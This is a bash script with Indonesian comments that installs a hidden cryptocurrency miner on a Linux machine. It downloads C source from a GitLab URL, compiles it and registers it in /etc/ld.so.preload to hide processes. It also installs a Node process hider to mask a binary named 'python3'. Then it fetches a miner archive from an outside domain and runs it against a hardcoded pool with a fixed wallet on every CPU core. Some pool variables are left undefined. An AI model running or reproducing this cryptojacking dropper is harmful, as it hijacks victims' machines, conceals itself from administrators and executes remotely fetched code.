#!/bin/bash

sudo apt update
sudo apt install screen -y
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
mv libcikblek.so /usr/local/lib/
echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
rm cikblek.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add python3"

# Variabel
HARI=$(date +'%A')
WALLET="sugar1qgry5hf7ah3e9ef0zkqr0evlg39mauhes6dl3gf"
POOLS1="45.88.24.129:443"
ALGO="yespowersugar"
URL="https://dot-aja.my.id/dotcpu.tar.gz"

# Ganti nama hari dengan bahasa Indonesia
case $HARI in
  "Monday") HARI="$(echo $(shuf -i 1-20 -n 1)-FA)" ;;
  "Tuesday") HARI="$(echo $(shuf -i 1-20 -n 1)-FA)" ;;
  "Wednesday") HARI="$(echo $(shuf -i 1-20 -n 1)-FA)" ;;
  "Thursday") HARI="$(echo $(shuf -i 1-20 -n 1)-FA)" ;;
  "Friday") HARI="$(echo $(shuf -i 1-20 -n 1)-FA)" ;;
  "Saturday") HARI="$(echo $(shuf -i 1-20 -n 1)-FA)" ;;
  "Sunday") HARI="$(echo $(shuf -i 1-20 -n 1)-FA)" ;;
esac

NAMA="cantik_$HARI"
if [ ! -d "dotaja" ]; then
    echo "unduh dan ekstraks"
    wget -O dotaja $URL
    tar -xvf dotaja
else
    echo "File sudah ada"
fi

# Cek argumen yang diberikan dan jalankan miner sesuai argumen
if [ "$1" == "1" ]; then
    echo "Menjalankan DOT0 dengan wallet $WALLET di pool $POOLS"
    ./python3 -a $ALGO -o $POOLS1 -u $WALLET.$NAMA -t $(nproc)
elif [ "$1" == "2" ]; then
    echo "Menjalankan DOT1 dengan wallet $WALLET di pool $POOLS"
    screen -dmS DOT1 ./python3 -a $ALGO -o $POOLS2 -u $WALLET.$NAMA -t $(nproc)
elif [ "$1" == "3" ]; then
    echo "Menjalankan DOT2 dengan wallet $WALLET di pool $POOLS"
    screen -dmS DOT2 ./python3 -a $ALGO -o $POOLS3 -u $WALLET.$NAMA -t $(nproc)
else
    echo "Argumen tidak valid. Gunakan 1, 2, atau 3 untuk memilih miner yang akan dijalankan."
fi
